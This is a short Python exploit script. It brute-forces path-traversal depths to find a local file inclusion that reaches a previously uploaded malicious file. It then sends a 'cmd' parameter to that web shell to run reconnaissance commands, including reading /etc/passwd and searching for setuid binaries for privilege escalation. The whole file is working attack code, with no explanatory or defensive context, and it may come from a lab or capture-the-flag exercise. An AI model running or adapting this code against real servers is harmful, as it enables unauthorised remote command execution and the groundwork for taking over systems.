#!/usr/bin/env python3

import requests
import urllib.parse


def brute_force_lfi(lfi_url_base, payload_relative, session, COOKIE):
    with open("lfi_combi.txt", "r") as f:
        file_data = f.read()

    lfi_combis = file_data.strip().split("\n")

    for combi in lfi_combis:
        for depth in range(1, 10):
            traversal = combi * depth
            test_url = f"{lfi_url_base}{traversal}{payload_relative}"
            print(f"[*] Trying LFI URL: {test_url}")
            try:
                response = session.get(test_url, cookies=COOKIE)
                if "[+] Malicious file uploaded successfully!" in response.text:
                    print(f"[+] Successfully included payload: {test_url}")
                    return test_url
            except Exception as e:
                print(f"[-] Error testing {test_url}: {str(e)}")
    return None


def trigger_payload_via_lfi(url, COOKIE):
    """
    Appends the command parameter to the LFI URL to trigger our uploaded payload.
    """
    commands = [
        "id",
        "uname -a",
        "grep 'x:1000:' /etc/passwd",
        "ls -lAh /home",
        "find /usr/bin /bin -perm -4000 2>/dev/null",
    ]
    cmd_string = ";".join(commands)
    separator = "&" if "?" in url else "?"
    full_url = f"{url}{separator}cmd={urllib.parse.quote(cmd_string)}"
    try:
        print(f"[*] Triggering payload via LFI at: {full_url}")
        response = requests.get(full_url, cookies=COOKIE)
        if response.status_code == 200:
            print("[+] Command results:")
            print(response.text)
            return response.text
        else:
            print(f"[-] Execution failed (HTTP {response.status_code})")
            return ""
    except Exception as e:
        print(f"[-] Trigger error: {str(e)}")
        return ""